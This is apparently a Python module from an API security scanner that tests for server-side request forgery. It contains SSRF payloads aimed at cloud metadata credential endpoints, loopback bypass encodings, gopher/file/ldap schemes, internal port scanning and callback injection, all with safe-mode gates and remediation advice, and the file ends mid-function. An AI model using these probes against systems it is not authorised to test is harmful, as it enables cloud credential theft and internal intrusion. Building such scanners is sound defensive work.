"""
SSRF Testing Module
Implements OWASP API7 - Server Side Request Forgery testing
"""

import re
import statistics
from dataclasses import dataclass
from typing import List, Dict, Any, Optional, Set, Tuple

from .registry import OWASPModule
from utils.findings import Finding
from utils.http_client import HTTPRequestEngine, Request, Response
from core.config import SSRFConfig, AuthContext, Severity
from core.logging import get_logger

# Imported lazily via TYPE_CHECKING to avoid circular imports; the spec_schema
# attribute is typed as Optional[Any] at runtime.
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from utils.spec_import import SpecSchema


# ---------------------------------------------------------------------------
# Probe dataclasses
# ---------------------------------------------------------------------------

@dataclass
class InternalProbe:
    """Represents a single internal-target SSRF probe payload.

    Attributes:
        payload: The full URL string to inject (e.g. ``http://169.254.169.254/...``).
        logical_target: Canonical address used for deduplication
            (e.g. ``"127.0.0.1"``).
        extra_headers: Provider-specific headers required by the target, such as
            ``{"Metadata-Flavor": "Google"}`` for GCP.
        is_bypass: ``True`` for IP-encoding bypass variants so the emitted
            finding category can be set to ``SSRF_SCHEME_BYPASS`` rather than
            ``SSRF_INTERNAL_ACCESS``.
    """

    payload: str
    logical_target: str
    extra_headers: Dict[str, str]
    is_bypass: bool


@dataclass
class SchemeProbe:
    """Represents a dangerous-scheme SSRF probe payload.

    Attributes:
        payload: The full URL string to inject (e.g. ``gopher://127.0.0.1/``).
        scheme: The bare scheme name (e.g. ``"gopher"``).
    """

    payload: str
    scheme: str


# ---------------------------------------------------------------------------
# Module-level probe constants
# ---------------------------------------------------------------------------

# Dangerous URL schemes to test for scheme-bypass SSRF vulnerabilities.
# This extends the legacy ``file://`` / ``ftp://`` pair from SSRFConfig.file_protocols.
SSRF_SCHEMES: List[str] = [
    "file://",
    "ftp://",
    "gopher://",
    "dict://",
    "sftp://",
    "ldap://",
]

# Cloud provider instance-metadata probes. Each entry carries the full metadata
# path *and* any provider-required headers so they are forwarded with the probe.
CLOUD_METADATA_PROBES: List[InternalProbe] = [
    # AWS IMDSv1
    InternalProbe(
        payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        logical_target="169.254.169.254",
        extra_headers={},
        is_bypass=False,
    ),
    # GCP — requires the Metadata-Flavor header
    InternalProbe(
        payload="http://metadata.google.internal/computeMetadata/v1/instance/",
        logical_target="metadata.google.internal",
        extra_headers={"Metadata-Flavor": "Google"},
        is_bypass=False,
    ),
    # Azure — requires the Metadata header
    InternalProbe(
        payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        logical_target="169.254.169.254",
        extra_headers={"Metadata": "true"},
        is_bypass=False,
    ),
    # DigitalOcean
    InternalProbe(
        payload="http://169.254.169.254/metadata/v1",
        logical_target="169.254.169.254",
        extra_headers={},
        is_bypass=False,
    ),
    # Oracle Cloud Infrastructure
    InternalProbe(
        payload="http://169.254.169.254/opc/v1/instance/",
        logical_target="169.254.169.254",
        extra_headers={},
        is_bypass=False,
    ),
]

# IP-encoding bypass probes for ``127.0.0.1``. All resolve to loopback but use
# alternative encodings that naive blocklists may not catch.
BYPASS_PROBES: List[InternalProbe] = [
    InternalProbe("http://2130706433/",                   "127.0.0.1", {}, True),  # decimal
    InternalProbe("http://0177.0.0.1/",                   "127.0.0.1", {}, True),  # octal
    InternalProbe("http://0x7f000001/",                   "127.0.0.1", {}, True),  # hex
    InternalProbe("http://[::1]/",                        "127.0.0.1", {}, True),  # IPv6 short
    InternalProbe("http://[0:0:0:0:0:ffff:127.0.0.1]/",  "127.0.0.1", {}, True),  # IPv6 full
    InternalProbe("http://0.0.0.0/",                     "127.0.0.1", {}, True),  # zero IP
    InternalProbe("http://user@127.0.0.1/",              "127.0.0.1", {}, True),  # credentials prefix
]


# HTTP methods that change server state. In safe mode these are skipped so that
# the module only issues non-state-changing probes (GET/HEAD).
STATE_CHANGING_METHODS = {"POST", "PUT", "PATCH", "DELETE"}

# Methods considered safe to probe with when safe mode is enabled.
SAFE_METHODS = {"GET", "HEAD"}

# Headers commonly used by servers to determine an upstream/forwarded host and
# therefore prone to SSRF when reflected into outbound requests.
SSRF_PRONE_HEADERS = [
    "X-Forwarded-For",
    "Referer",
    "X-Forwarded-Host",
    "X-Forwarded-Proto",
]

# Query parameter names that frequently carry a URL/host the server will fetch.
SSRF_QUERY_PARAMS = ["url", "uri", "target", "dest", "redirect", "host"]

# JSON body field names commonly used to supply a URL/host for server-side fetching.
# These are injected when body_injection is enabled on POST/PUT/PATCH endpoints
# (Requirement 3.1).
JSON_BODY_FIELDS: List[str] = [
    "url", "uri", "target", "webhook", "callback", "imageUrl", "avatarUrl",
    "feedUrl", "importUrl", "source", "endpoint", "api", "service", "host",
    "destination",
]

# Signatures that indicate cloud metadata or internal-host content was reached.
INTERNAL_TARGET_SIGNATURES = [
    "ami-id",
    "instance-id",
    "instance-action",
    "iam/security-credentials",
    "meta-data",
    "computeMetadata",
    "metadata.google.internal",
    "access_token",
    "security-credentials",
    "local-hostname",
    "public-ipv4",
]

# Signatures that indicate file-system content was returned (e.g. /etc/passwd,
# directory listings) via a file:// or ftp:// payload.
FILE_PROTOCOL_SIGNATURES = [
    "root:x:",
    "root:",
    "daemon:",
    "bin:x:",
    "nobody:",
    "/bin/bash",
    "/usr/sbin/nologin",
    "Index of /",
    "Directory listing for",
]


class SSRFTestingModule(OWASPModule):
    """
    SSRF Testing Module for detecting Server Side Request Forgery (OWASP API7).

    For each endpoint the module injects internal targets (e.g. cloud metadata
    endpoints, loopback hosts) and file-protocol payloads into query parameters
    and SSRF-prone request headers. It emits:
      - SSRF_INTERNAL_ACCESS when internal/metadata content is reachable.
      - FILE_PROTOCOL_ACCESS when file-system content is returned.

    Safe Mode (config.safe_mode) restricts probing to non-state-changing
    methods (GET/HEAD) and skips state-changing methods entirely.
    """

    def __init__(self, config: SSRFConfig, http_client: HTTPRequestEngine,
                 auth_contexts: List[AuthContext],
                 spec_schema: "Optional[Any]" = None):
        super().__init__(config)
        self.http_client = http_client
        self.auth_contexts = auth_contexts
        self.logger = get_logger(__name__).bind(module="ssrf")

        # Create auth context mapping
        self.auth_context_map = {ctx.name: ctx for ctx in auth_contexts}

        # Safe mode flag — read directly from the config field (Requirement 1.1, 10.6).
        self.safe_mode = self.config.safe_mode

        # Optional SpecSchema from --openapi / --postman / --swagger sources.
        # When present, _test_body_injection uses the spec to target only the
        # body fields actually declared for each endpoint, rather than injecting
        # all 15 generic JSON_BODY_FIELDS blindly. Falls back to JSON_BODY_FIELDS
        # when spec_schema is None or the endpoint has no declared operation.
        self.spec_schema = spec_schema

        # Deduplication tracker (Requirement 12.5, design §8).
        # Tracks (endpoint_url, category, logical_target) tuples already emitted.
        self._emitted: Set[Tuple[str, str, str]] = set()
        # Maps the dedup key to the first-emitted Finding so payloads can be
        # appended when a duplicate is detected.
        self._emitted_findings: Dict[Tuple[str, str, str], Finding] = {}

        self.logger.info("SSRF Testing Module initialized",
                         internal_targets=len(config.internal_targets),
                         additional_targets=len(config.additional_internal_targets),
                         bypass_encodings=config.bypass_encodings,
                         safe_mode=self.safe_mode,
                         spec_schema=spec_schema is not None)

    def get_module_name(self) -> str:
        """Get module name"""
        return "ssrf"

    async def execute_tests(self, endpoints: List[Any]) -> List[Finding]:
        """
        Execute SSRF tests on discovered endpoints.

        Args:
            endpoints: List of discovered endpoints

        Returns:
            List of SSRF findings. Returns [] (with no HTTP requests) for an
            empty endpoint list.
        """
        # Reset per-scan deduplication state so re-runs are independent
        # (Requirement 12.5, design §8).
        self._emitted = set()
        self._emitted_findings = {}

        # Empty-input safety: no endpoints -> no work, no requests.
        if not endpoints:
            self.logger.info("No endpoints provided for SSRF testing")
            return []

        self.logger.info("Starting SSRF testing",
                         endpoints_count=len(endpoints),
                         safe_mode=self.safe_mode)

        findings: List[Finding] = []

        # Use first available auth context for testing
        if self.auth_contexts:
            self.http_client.set_auth_context(self.auth_contexts[0])

        internal_probes, scheme_probes = self._build_probe_set()

        self.logger.debug("Probe set built",
                          internal_probes=len(internal_probes),
                          scheme_probes=len(scheme_probes))

        for endpoint in endpoints:
            endpoint_url = endpoint.url if hasattr(endpoint, 'url') else str(endpoint)
            method = endpoint.method if hasattr(endpoint, 'method') else 'GET'

            # Honor safe mode: skip state-changing methods entirely and only
            # probe with non-state-changing methods.
            if self.safe_mode:
                if method.upper() in STATE_CHANGING_METHODS:
                    self.logger.debug("Skipping state-changing endpoint in safe mode",
                                      endpoint=endpoint_url, method=method)
                    continue
                if method.upper() not in SAFE_METHODS:
                    method = "GET"

            try:
                endpoint_findings = await self._test_endpoint(
                    endpoint_url, method, internal_probes, scheme_probes
                )
                findings.extend(endpoint_findings)
            except Exception as e:
                self.logger.debug("SSRF endpoint test failed",
                                  endpoint=endpoint_url,
                                  error=str(e))

            try:
                port_scan_findings = await self._test_port_scan(endpoint_url, method)
                findings.extend(port_scan_findings)
            except Exception as e:
                self.logger.debug("SSRF port scan test failed",
                                  endpoint=endpoint_url,
                                  error=str(e))

            try:
                redirect_chain_findings = await self._test_redirect_chain(
                    endpoint_url, method, internal_probes
                )
                findings.extend(redirect_chain_findings)
            except Exception as e:
                self.logger.debug("SSRF redirect-chain test failed",
                                  endpoint=endpoint_url,
                                  error=str(e))

        # --- Import sources (Full_Replay_Mode) ---
        # Load Burp XML / HAR requests and probe each one independently.
        has_import_sources = bool(
            self.config.burp_xml_path or self.config.har_path
        )
        if has_import_sources:
            try:
                imported_requests = self._load_import_sources()
            except Exception as exc:
                self.logger.error(
                    "Failed to load import sources; skipping Full_Replay_Mode",
                    error=str(exc),
                )
                imported_requests = []

            # Determine the base URL from the first endpoint or fall back to
            # the first endpoint string.
            base_url: str = ""
            if endpoints:
                first = endpoints[0]
                raw = first.url if hasattr(first, "url") else str(first)
                from urllib.parse import urlsplit, urlunsplit
                parts = urlsplit(raw)
                base_url = urlunsplit((parts.scheme, parts.netloc, "", "", ""))

            for imp_req in imported_requests:
                try:
                    imp_findings = await self._test_imported_request(
                        imp_req, base_url, internal_probes, scheme_probes
                    )
                    findings.extend(imp_findings)
                except Exception as exc:
                    self.logger.debug(
                        "Full_Replay_Mode probe failed",
                        method=imp_req.method,
                        path=imp_req.path,
                        error=str(exc),
                    )

        self.logger.info("SSRF testing completed",
                         total_findings=len(findings),
                         critical_findings=len([f for f in findings
                                                if f.severity == Severity.CRITICAL]))

        return findings

    async def _test_endpoint(self, endpoint_url: str, method: str,
                             internal_probes: List[InternalProbe],
                             scheme_probes: List[SchemeProbe]) -> List[Finding]:
        """
        Test a single endpoint by injecting internal probes and scheme probes
        into query parameters and SSRF-prone headers, then delegating to body
        and OOB injection.

        Category selection rules (Requirements 2.1–2.8, 5.4, 6.6):
        - InternalProbe with ``is_bypass=True`` and (signature match OR 2xx):
          emit ``SSRF_SCHEME_BYPASS`` (HIGH).
        - InternalProbe with ``logical_target`` in cloud-metadata set and
          signature match: emit ``SSRF_CLOUD_METADATA`` (CRITICAL).
        - Any other InternalProbe signature/success match:
          emit ``SSRF_INTERNAL_ACCESS`` (CRITICAL).
        - SchemeProbe with status < 500: emit ``SSRF_SCHEME_BYPASS`` (HIGH).
        - SchemeProbe with file-system signature match: emit
          ``FILE_PROTOCOL_ACCESS`` (CRITICAL).
        All findings are routed through ``_dedup_finding()`` before appending.
        """
        findings: List[Finding] = []

        # Cloud metadata logical targets — probes for these emit SSRF_CLOUD_METADATA
        # when a signature match is found (Requirement 6.6, 2.4).
        CLOUD_METADATA_TARGETS = {"169.254.169.254", "metadata.google.internal"}

        # 1. Internal-target injection (query params + headers)
        for probe in internal_probes:
            payload = probe.payload

            for injection_type, probe_kwargs in (
                ("query", {"params": {p: payload for p in SSRF_QUERY_PARAMS}}),
                ("header", {"headers": self._build_probe_headers(probe, payload)}),
            ):
                result = await self._probe(endpoint_url, method, **probe_kwargs)
                # Get the raw finding from the base analyzer (always SSRF_INTERNAL_ACCESS).
                raw_finding = self._analyze_internal_response(
                    endpoint_url, method, payload, result, injection_type
                )
                if raw_finding is None:
                    continue

                # Determine the response status for bypass detection.
                status_code = result.status_code if result is not None else 0
                is_2xx = 200 <= status_code < 300

                # Signature was matched if _analyze_internal_response returned a finding.
                signature_matched = (
                    self._match_signature(
                        self._response_text(result) if result else "",
                        INTERNAL_TARGET_SIGNATURES,
                    ) is not None
                )

                # --- Category/severity override ---
                if probe.is_bypass and (signature_matched or is_2xx):
                    # Bypass-encoded loopback that produced a hit → SSRF_SCHEME_BYPASS (HIGH)
                    raw_finding.category = "SSRF_SCHEME_BYPASS"
                    raw_finding.severity = Severity.HIGH
                    raw_finding.recommendation = (
                        "Blocklist-based SSRF filters can be evaded with IP-encoding "
                        "bypass variants (decimal, octal, hex, IPv6). Use an explicit "
                        "allow-list of permitted outbound targets instead of a deny-list."
                    )
                elif probe.logical_target in CLOUD_METADATA_TARGETS and signature_matched:
                    # Cloud metadata endpoint that returned recognisable content → SSRF_CLOUD_METADATA (CRITICAL)
                    raw_finding.category = "SSRF_CLOUD_METADATA"
                    raw_finding.severity = Severity.CRITICAL
                    raw_finding.recommendation = (
                        "Cloud instance metadata endpoints are reachable via SSRF. "
                        "Block outbound access to 169.254.169.254 and metadata.google.internal "
                        "at the network layer, and use IMDSv2 (token-required) on AWS instances."
                    )
                # else: keep SSRF_INTERNAL_ACCESS / CRITICAL from _analyze_internal_response

                deduped = self._dedup_finding(raw_finding, probe.logical_target)
                if deduped is not None:
                    findings.append(deduped)

        # 2. Scheme-probe injection (query params + headers)
        for probe in scheme_probes:
            payload = probe.payload

            for injection_type, probe_kwargs in (
                ("query", {"params": {p: payload for p in SSRF_QUERY_PARAMS}}),
                ("header", {"headers": {h: payload for h in SSRF_PRONE_HEADERS}}),
            ):
                result = await self._probe(endpoint_url, method, **probe_kwargs)

                # Check for file-system signatures first.
                file_finding = self._analyze_file_response(
                    endpoint_url, method, payload, result, injection_type
                )

                if file_finding is not None:
                    # FILE_PROTOCOL_ACCESS (CRITICAL) — file-system content matched.
                    deduped = self._dedup_finding(file_finding, probe.scheme)
                    if deduped is not None:
                        findings.append(deduped)
                elif result is not None and result.status_code < 500:
                    # Non-error response to a dangerous scheme probe → SSRF_SCHEME_BYPASS (HIGH).
                    # This catches cases where the server fetched the URL but didn't reflect
                    # file-system signatures (Requirement 5.4, 2.6).
                    self.logger.warning(
                        "Potential scheme-bypass SSRF detected",
                        endpoint=endpoint_url,
                        scheme=probe.scheme,
                        injection_point=injection_type,
                        status_code=result.status_code,
                    )
                    bypass_finding = Finding(
                        id="",
                        scan_id="",
                        category="SSRF_SCHEME_BYPASS",
                        owasp_category="API7",
                        severity=Severity.HIGH,
                        endpoint=endpoint_url,
                        method=method,
                        status_code=result.status_code,
                        response_size=(
                            len(result.content) if result.content is not None else 0
                        ),
                        response_time=result.elapsed,
                        evidence=(
                            f"Dangerous URL scheme '{probe.scheme}://' returned a "
                            f"non-error response ({result.status_code}) via "
                            f"{injection_type} injection, indicating the server may "
                            f"have processed the scheme-based payload."
                        ),
                        recommendation=(
                            "Disable support for dangerous URL schemes (file://, ftp://, "
                            "gopher://, dict://, sftp://, ldap://) in server-side fetchers. "
                            "Allow-list only http:// and https:// for outbound requests."
                        ),
                        payload=f"{injection_type}={payload}",
                    )
                    deduped = self._dedup_finding(bypass_finding, probe.scheme)
                    if deduped is not None:
                        findings.append(deduped)

        # 3. JSON body injection (POST/PUT/PATCH only; gated by config.body_injection
        #    and safe_mode inside the method itself).
        body_findings = await self._test_body_injection(
            endpoint_url, method, internal_probes, scheme_probes
        )
        findings.extend(body_findings)

        # 4. Out-of-band / blind SSRF injection (gated by config.callback_url
        #    inside the method itself).
        oob_findings = await self._test_oob_injection(endpoint_url, method)
        findings.extend(oob_findings)

        return findings

    def _build_probe_headers(self, probe: "InternalProbe", payload: str) -> Dict[str, str]:
        """Build the header dict for an InternalProbe injection.

        Merges the standard SSRF-prone headers (each set to *payload*) with any
        provider-specific extra headers carried by the probe (e.g.
        ``Metadata-Flavor: Google`` for GCP).  Extra headers override the
        probe payload on any key collision, which is intentional: provider
        headers must take their specific values rather than the SSRF payload.
        """
        headers = {h: payload for h in SSRF_PRONE_HEADERS}
        if probe.extra_headers:
            headers.update(probe.extra_headers)
        return headers

    async def _test_body_injection(
        self,
        endpoint_url: str,
        method: str,
        internal_probes: "List[InternalProbe]",
        scheme_probes: "List[SchemeProbe]",
    ) -> "List[Finding]":
        """JSON body injection for POST/PUT/PATCH endpoints (Requirement 3).

        For each JSON body field name in ``JSON_BODY_FIELDS``, this method
        injects every ``InternalProbe`` and ``SchemeProbe`` payload as a
        single-key JSON body ``{field_name: probe.payload}`` with
        ``Content-Type: application/json``.

        **Method resolution** (in order of priority):
        1. If ``config.body_injection_methods`` is non-empty, those methods are
           used for every body probe regardless of the endpoint's own method.
           This lets the operator force POST/PUT/PATCH probes on endpoints the
           discovery engine only saw as GET (the most common real-world scenario
           where the API accepts a URL in a JSON body on a POST endpoint but the
           discovery only exercised GET).
        2. Otherwise, ``method`` is used — but only when it is in
           ``{POST, PUT, PATCH}``.

        Early-return guards (in order):
        1. ``safe_mode=True`` — body injection is a state-changing operation;
           skip entirely (Requirement 3.4, 10.2).
        2. ``body_injection=False`` — feature is opt-in; skip unless explicitly
           enabled (Requirement 3.3).
        3. After method resolution, if the effective method set is empty (i.e.
           the endpoint method is not POST/PUT/PATCH and no override is
           configured), return immediately.

        Each finding is routed through ``_dedup_finding()`` before being
        collected. Evidence clearly identifies the injection type as ``"body"``
        and includes the specific field name and HTTP method used
        (Requirements 3.5, 13.3).

        Args:
            endpoint_url: The target endpoint URL.
            method: The HTTP method recorded by the discovery engine for this
                endpoint. Used as a fallback when ``body_injection_methods``
                is empty.
            internal_probes: Probe list from ``_build_probe_set()``.
            scheme_probes: Scheme probe list from ``_build_probe_set()``.

        Returns:
            A (possibly empty) list of deduplicated :class:`Finding` objects.
        """
        # Guard 1: Safe mode skips all body-injection probes (Req 3.4, 10.2).
        if self.config.safe_mode:
            return []

        # Guard 2: Body injection is opt-in (Req 3.3).
        if not self.config.body_injection:
            return []

        # --- Method resolution ---
        # If the operator supplied explicit body_injection_methods, use them.
        # This is the fix for the common case where discovery only sees the
        # endpoint as GET but the API actually accepts a URL in a POST body.
        body_methods_override = [
            m.upper() for m in (self.config.body_injection_methods or [])
            if m.strip()
        ]
        if body_methods_override:
            # Operator-forced methods: only keep the body-carrying ones.
            effective_methods = [
                m for m in body_methods_override
                if m in {"POST", "PUT", "PATCH"}
            ]
            if not effective_methods:
                self.logger.debug(
                    "body_injection_methods configured but none are POST/PUT/PATCH; "
                    "skipping body injection",
                    endpoint=endpoint_url,
                    configured=body_methods_override,
                )
                return []
        else:
            # Fallback: use the endpoint's own method if it is body-carrying.
            if method.upper() not in {"POST", "PUT", "PATCH"}:
                return []
            effective_methods = [method.upper()]

        findings: List[Finding] = []
        # JSON Content-Type header required for body injection probes.
        json_content_type_header = {"Content-Type": "application/json"}

        for probe_method in effective_methods:
            # Resolve body fields: spec-aware when a SpecSchema is available,
            # generic JSON_BODY_FIELDS otherwise.
            body_fields = self._build_ssrf_body_fields(endpoint_url, probe_method)

            self.logger.debug(
                "Running body injection probes",
                endpoint=endpoint_url,
                method=probe_method,
                body_fields=len(body_fields),
                internal_probes=len(internal_probes),
                scheme_probes=len(scheme_probes),
            )

            # --- InternalProbe body injection ---
            for field_name in body_fields:
                for probe in internal_probes:
                    body = {field_name: probe.payload}
                    result = await self._probe(
                        endpoint_url,
                        probe_method,
                        headers=json_content_type_header,
                        json=body,
                    )

                    raw_finding = self._analyze_internal_response(
                        endpoint_url,
                        probe_method,
                        probe.payload,
                        result,
                        injection_point="body",
                    )
                    if raw_finding is None:
                        continue

                    # Enrich evidence with the field name and method used (Req 3.5, 13.3).
                    raw_finding.evidence = (
                        f"[body:{field_name}] {raw_finding.evidence}"
                    )
                    # Enrich payload field to record injection type, method and field name.
                    raw_finding.payload = f"body[{field_name}]={probe.payload}"
                    raw_finding.method = probe_method

                    # Apply the same category/severity overrides as _test_endpoint.
                    CLOUD_METADATA_TARGETS = {"169.254.169.254", "metadata.google.internal"}
                    status_code = result.status_code if result is not None else 0
                    is_2xx = 200 <= status_code < 300
                    signature_matched = (
                        self._match_signature(
                            self._response_text(result) if result else "",
                            INTERNAL_TARGET_SIGNATURES,
                        ) is not None
                    )

                    if probe.is_bypass and (signature_matched or is_2xx):
                        raw_finding.category = "SSRF_SCHEME_BYPASS"
                        raw_finding.severity = Severity.HIGH
                        raw_finding.recommendation = (
                            "Blocklist-based SSRF filters can be evaded with IP-encoding "
                            "bypass variants (decimal, octal, hex, IPv6). Use an explicit "
                            "allow-list of permitted outbound targets instead of a deny-list."
                        )
                    elif probe.logical_target in CLOUD_METADATA_TARGETS and signature_matched:
                        raw_finding.category = "SSRF_CLOUD_METADATA"
                        raw_finding.severity = Severity.CRITICAL
                        raw_finding.recommendation = (
                            "Cloud instance metadata endpoints are reachable via SSRF body "
                            "injection. Block outbound access to 169.254.169.254 and "
                            "metadata.google.internal at the network layer, and use IMDSv2 "
                            "(token-required) on AWS instances."
                        )

                    deduped = self._dedup_finding(raw_finding, probe.logical_target)
                    if deduped is not None:
                        findings.append(deduped)

            # --- SchemeProbe body injection ---
            for field_name in body_fields:
                for probe in scheme_probes:
                    body = {field_name: probe.payload}
                    result = await self._probe(
                        endpoint_url,
                        probe_method,
                        headers=json_content_type_header,
                        json=body,
                    )

                    # Check for file-system signature first (FILE_PROTOCOL_ACCESS).
                    file_finding = self._analyze_file_response(
                        endpoint_url,
                        probe_method,
                        probe.payload,
                        result,
                        injection_point="body",
                    )

                    if file_finding is not None:
                        # Enrich evidence and payload with body-injection context.
                        file_finding.evidence = (
                            f"[body:{field_name}] {file_finding.evidence}"
                        )
                        file_finding.payload = f"body[{field_name}]={probe.payload}"
                        deduped = self._dedup_finding(file_finding, probe.scheme)
                        if deduped is not None:
                            findings.append(deduped)

                    elif result is not None and result.status_code < 500:
                        # Non-error response to a dangerous scheme → SSRF_SCHEME_BYPASS (HIGH).
                        self.logger.warning(
                            "Potential scheme-bypass SSRF via body injection detected",
                            endpoint=endpoint_url,
                            scheme=probe.scheme,
                            field_name=field_name,
                            status_code=result.status_code,
                        )
                        bypass_finding = Finding(
                            id="",
                            scan_id="",
                            category="SSRF_SCHEME_BYPASS",
                            owasp_category="API7",
                            severity=Severity.HIGH,
                            endpoint=endpoint_url,
                            method=probe_method,
                            status_code=result.status_code,
                            response_size=(
                                len(result.content) if result.content is not None else 0
                            ),
                            response_time=result.elapsed,
                            evidence=(
                                f"[body:{field_name}] Dangerous URL scheme "
                                f"'{probe.scheme}://' injected into JSON body field "
                                f"'{field_name}' via {probe_method} returned a non-error "
                                f"response ({result.status_code}), indicating the server "
                                f"may have processed the scheme-based payload."
                            ),
                            recommendation=(
                                "Disable support for dangerous URL schemes (file://, ftp://, "
                                "gopher://, dict://, sftp://, ldap://) in server-side fetchers. "
                                "Allow-list only http:// and https:// for outbound requests, and "
                                "validate JSON body fields that accept URLs."
                            ),
                            payload=f"body[{field_name}]={probe.payload}",
                        )
                        deduped = self._dedup_finding(bypass_finding, probe.scheme)
                        if deduped is not None:
                            findings.append(deduped)

        return findings

    async def _test_oob_injection(
        self,
        endpoint_url: str,
        method: str,
    ) -> "List[Finding]":
        """Out-of-band / blind SSRF detection via callback URL injection (Req 4).

        Injects the operator-supplied ``config.callback_url`` into every
        standard injection point and emits ``SSRF_BLIND`` (CRITICAL) when the
        server appears to have fetched the callback URL without reflecting its
        content — heuristic: 2xx response + no ``INTERNAL_TARGET_SIGNATURES``
        match.

        Injection points (in order):
        1. All ``SSRF_QUERY_PARAMS`` — GET-style query params, any HTTP method.
        2. All ``SSRF_PRONE_HEADERS`` — any HTTP method.
        3. All ``JSON_BODY_FIELDS`` — only when ``method`` is POST/PUT/PATCH
           *and* ``safe_mode`` is ``False``.

        Because the module cannot poll the operator's listener directly, the
        ``recommendation`` field explicitly instructs the operator to check
        their Burp Collaborator / Interactsh listener for incoming DNS/HTTP
        requests triggered by the injected URL (Req 4.4, design §4 OOB note).

        All findings are routed through ``_dedup_finding()`` using
        ``logical_target=self.config.callback_url``.

        Args:
            endpoint_url: The target endpoint URL.
            method: The HTTP method associated with the endpoint.

        Returns:
            A (possibly empty) list of deduplicated :class:`Finding` objects.
        """
        # Guard: no callback URL → no OOB probes (Req 4.2).
        if not self.config.callback_url:
            return []

        callback_url: str = self.config.callback_url
        findings: List[Finding] = []

        OOB_RECOMMENDATION = (
            "Check your out-of-band (OOB) listener (e.g. Burp Collaborator, Interactsh) "
            "for incoming DNS or HTTP requests triggered by the injected callback URL. "
            "A hit on the listener confirms blind SSRF. Remediate by validating and "
            "allow-listing all outbound request targets, and disabling unused URL-fetch "
            "features in the application."
        )

        def _is_blind_hit(result: Optional[Response]) -> bool:
            """True when response is 2xx with no reflected internal-target content."""
            if result is None:
                return False
            if not (200 <= result.status_code < 300):
                return False
            body = self._response_text(result)
            return self._match_signature(body, INTERNAL_TARGET_SIGNATURES) is None

        def _make_blind_finding(
            injection_type: str,
            param_name: str,
            status_code: int,
            response_size: int,
            response_time: float,
        ) -> Finding:
            return Finding(
                id="",
                scan_id="",
                category="SSRF_BLIND",
                owasp_category="API7",
                severity=Severity.CRITICAL,
                endpoint=endpoint_url,
                method=method,
                status_code=status_code,
                response_size=response_size,
                response_time=response_time,
                evidence=(
                    f"Potential blind SSRF via {injection_type} injection. "
                    f"Callback URL '{callback_url}' was injected into "
                    f"{injection_type} '{param_name}' and the server returned a "
                    f"2xx response ({status_code}) without reflecting internal-target "
                    f"content, suggesting the server may have fetched the callback URL."
                ),
                recommendation=OOB_RECOMMENDATION,
                payload=f"{injection_type}[{param_name}]={callback_url}",
            )

        # 1. Query parameter injection (any method) (Req 4.1)
        for param in SSRF_QUERY_PARAMS:
            result = await self._probe(
                endpoint_url,
                method,
                params={param: callback_url},
            )
            if _is_blind_hit(result):
                self.logger.warning(
                    "Potential blind SSRF via query param injection",
                    endpoint=endpoint_url,
                    param=param,
                    status_code=result.status_code,
                )
                finding = _make_blind_finding(
                    injection_type="query",
                    param_name=param,
                    status_code=result.status_code,
                    response_size=len(result.content) if result.content is not None else 0,
                    response_time=result.elapsed,
                )
                deduped = self._dedup_finding(finding, callback_url)
                if deduped is not None:
                    findings.append(deduped)

        # 2. Header injection (any method) (Req 4.1)
        for header in SSRF_PRONE_HEADERS:
            result = await self._probe(
                endpoint_url,
                method,
                headers={header: callback_url},
            )
            if _is_blind_hit(result):
                self.logger.warning(
                    "Potential blind SSRF via header injection",
                    endpoint=endpoint_url,
                    header=header,
                    status_code=result.status_code,
                )
                finding = _make_blind_finding(
                    injection_type="header",
                    param_name=header,
                    status_code=result.status_code,
                    response_size=len(result.content) if result.content is not None else 0,
                    response_time=result.elapsed,
                )
                deduped = self._dedup_finding(finding, callback_url)
                if deduped is not None:
                    findings.append(deduped)

        # 3. JSON body injection (POST/PUT/PATCH only, safe_mode must be False) (Req 4.1)
        if method.upper() in {"POST", "PUT", "PATCH"} and not self.config.safe_mode:
            json_content_type_header = {"Content-Type": "application/json"}
            for field_name in JSON_BODY_FIELDS:
                result = await self._probe(
                    endpoint_url,
                    method,
                    headers=json_content_type_header,
                    json={field_name: callback_url},
                )
                if _is_blind_hit(result):
                    self.logger.warning(
                        "Potential blind SSRF via JSON body injection",
                        endpoint=endpoint_url,
                        field_name=field_name,
                        status_code=result.status_code,
                    )
                    finding = _make_blind_finding(
                        injection_type="body",
                        param_name=field_name,
                        status_code=result.status_code,
                        response_size=len(result.content) if result.content is not None else 0,
                        response_time=result.elapsed,
                    )
                    deduped = self._dedup_finding(finding, callback_url)
                    if deduped is not None:
                        findings.append(deduped)

        return findings

    async def _test_port_scan(
        self,
        endpoint_url: str,
        method: str,
    ) -> "List[Finding]":
        """Internal port scanning via SSRF probes (Requirements 7.1–7.5, 2.5, 10.3).

        Injects ``http://127.0.0.1:{port}/`` payloads into every ``SSRF_QUERY_PARAMS``
        for each port in ``config.scan_ports``, then uses timing and status-code
        differentials to detect open internal ports.

        Early-return guards (in order):
        1. ``allow_port_scan=False`` — port scanning is opt-in; skip (Req 7.2).
        2. ``safe_mode=True`` — port scanning is aggressive; skip in safe mode (Req 10.3).
        3. ``scan_ports`` empty — nothing to scan; log a WARNING and return [] (Req 7.3).

        Detection heuristic — ``SSRF_PORT_SCAN`` (MEDIUM) is emitted when:
        - Response status is outside the 4xx range (``< 400 or >= 500``), OR
        - Response time is more than 2000 ms below the median response time across
          all port probes (fast response relative to peers suggests the port is open
          while unreachable ports time out).

        Evidence includes: endpoint, port number, status code, response time in ms,
        and the computed median response time (Req 13.1).

        Args:
            endpoint_url: The target endpoint URL.
            method: The HTTP method associated with the endpoint.

        Returns:
            A (possibly empty) list of :class:`Finding` objects — one per detected
            open port after deduplication.
        """
        # Guard 1: port scanning is gated by allow_port_scan (Req 7.2).
        if not self.config.allow_port_scan:
            return []

        # Guard 2: skip in safe mode (Req 10.3).
        if self.config.safe_mode:
            return []

        # Guard 3: no ports configured — warn and bail (Req 7.3).
        if not self.config.scan_ports:
            self.logger.warning(
                "Port scan requested but scan_ports is empty; skipping",
                endpoint=endpoint_url,
            )
            return []

        # Collect (port, status_code, response_time_ms) for every probe.
        results: List[Tuple[int, int, float]] = []

        for port in self.config.scan_ports:
            payload = f"http://127.0.0.1:{port}/"
            # Inject into each query param and take the first non-None response
            # (or None if all fail).
            response: Optional[Response] = None
            for param in SSRF_QUERY_PARAMS:
                response = await self._probe(
                    endpoint_url,
                    method,
                    params={param: payload},
                )
                if response is not None:
                    break

            if response is not None:
                # Convert elapsed (seconds float from httpx) to milliseconds.
                response_time_ms = (response.elapsed or 0.0) * 1000.0
                results.append((port, response.status_code, response_time_ms))
